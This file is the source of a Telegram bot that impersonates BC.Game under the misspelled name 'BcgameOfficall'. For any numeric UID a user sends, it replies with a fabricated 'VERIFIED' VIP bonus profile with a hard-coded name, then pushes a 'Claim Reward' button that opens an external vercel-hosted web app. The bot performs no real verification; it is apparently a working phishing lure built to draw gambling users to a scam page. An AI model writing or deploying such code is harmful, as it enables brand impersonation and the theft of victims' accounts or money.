const { Telegraf, Markup } = require('telegraf');
require('dotenv').config();

const bot = new Telegraf(process.env.BOT_TOKEN);
const WEBAPP_URL = process.env.WEBAPP_URL || 'https://telegrambot-navy.vercel.app/';

// Set your image URLs here
const START_IMAGE = 'https://i.ibb.co/example/start.png'; // Replace with your link
const PROFILE_IMAGE = 'https://i.ibb.co/example/profile.png'; // Replace with your link

bot.start(async (ctx) => {
    try {
        await ctx.replyWithPhoto(START_IMAGE, {
            caption: `Welcome to BcgameOfficall.\n\nSend your BC.Game UID to verify your VIP status and claim your bonus.`,
            ...Markup.inlineKeyboard([
                [Markup.button.url('Join Channel', 'https://t.me/bcgame_official')]
            ])
        });
    } catch (e) {
        ctx.reply(`Welcome to BcgameOfficall.\n\nSend your BC.Game UID to verify your VIP status and claim your bonus.`, Markup.inlineKeyboard([
            [Markup.button.url('Join Channel', 'https://t.me/bcgame_official')]
        ]));
    }
});

bot.on('text', async (ctx) => {
    const uid = ctx.message.text;
    if (/^\d+$/.test(uid)) {
        const profileText = `BC GAME PLAYER PROFILE
━━━━━━━━━━━━━━━━━━━━
👤 Name  : gammaophq
🆔 UID   : ${uid}
🥇 Rank  : Beginner
━━━━━━━━━━━━━━━━━━━━
BONUS DETAILS
━━━━━━━━━━━━━━━━━━━━
🎁 ENGINE REWARDS
📌 Status : ✅ VERIFIED
— Claim is available`;

        try {
            await ctx.replyWithPhoto(PROFILE_IMAGE, {
                caption: profileText,
                ...Markup.inlineKeyboard([
                    [Markup.button.webApp('Claim Reward', WEBAPP_URL)]
                ])
            });
        } catch (e) {
            ctx.reply(profileText, Markup.inlineKeyboard([
                [Markup.button.webApp('Claim Reward', WEBAPP_URL)]
            ]));
        }
    } else {
        ctx.reply('Please enter a valid numeric User ID.');
    }
});

bot.launch().then(() => console.log('Bot is running...'));
